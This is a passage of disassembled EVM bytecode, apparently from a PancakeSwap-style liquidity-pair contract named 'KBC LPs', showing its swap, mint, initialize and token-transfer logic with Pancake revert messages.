0x20 DUP2 LT ISZERO PUSH2 0x4B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x10FE JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1110 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1116 JUMP JUMPDEST PUSH2 0x51B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x50B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1128 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0x14CC JUMP JUMPDEST PUSH2 0x280 PUSH2 0x14DB JUMP JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x55A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x14FD JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x150A JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x58E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1510 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1679 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1688 JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1697 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x615 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1897 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x63B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1AE6 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1B03 JUMP JUMPDEST PUSH2 0x276 PUSH2 0x1B09 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x6AC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6BF JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x6FA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x266D PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x705 PUSH2 0xC3A JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x72A JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x77B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP1 PUSH1 0x64 PUSH1 0x5 DUP12 MUL DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0x5 DUP12 MUL PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x7D2 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x819 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x82A JUMPI PUSH2 0x82A DUP3 DUP13 DUP7 PUSH2 0x1C69 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x83B JUMPI PUSH2 0x83B DUP2 DUP13 DUP6 PUSH2 0x1C69 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x8F6 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8F1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x64 PUSH1 0x5 DUP15 DUP2 MUL DUP3 SWAP1 DIV SWAP2 SWAP1 DUP15 MUL DIV DUP15 ISZERO PUSH2 0x923 JUMPI PUSH1 0x6 SLOAD PUSH2 0x923 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1C69 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x941 JUMPI PUSH1 0x6 SLOAD PUSH2 0x941 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x987 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x99B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA11 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA27 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xA4E JUMPI PUSH1 0x0 PUSH2 0xA5D JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xA7A JUMPI PUSH1 0x0 PUSH2 0xA89 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xA9A JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xAD5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25DD PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB09 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xAFD DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB21 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xB53 PUSH4 0x5F5E100 PUSH2 0xB47 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xB63 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST LT ISZERO PUSH2 0xBA3 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xBB1 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x2079 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCDE JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xD9E JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xD79 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xDA9 DUP5 DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0xE4B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0xE5B PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xED9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF40 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF56 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0xF75 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xF92 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFA0 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0xFDD JUMPI PUSH2 0xFC9 PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22F6 JUMP JUMPDEST SWAP9 POP PUSH2 0xFD8 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x102C JUMP JUMPDEST PUSH2 0x1029 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1001 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x101C DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1023 JUMPI INVALID JUMPDEST DIV PUSH2 0x23CC JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x106B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2690 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1075 DUP11 DUP11 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x10B1 JUMPI PUSH1 0xB SLOAD PUSH2 0x10AD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1174 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1184 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x11F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x120A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 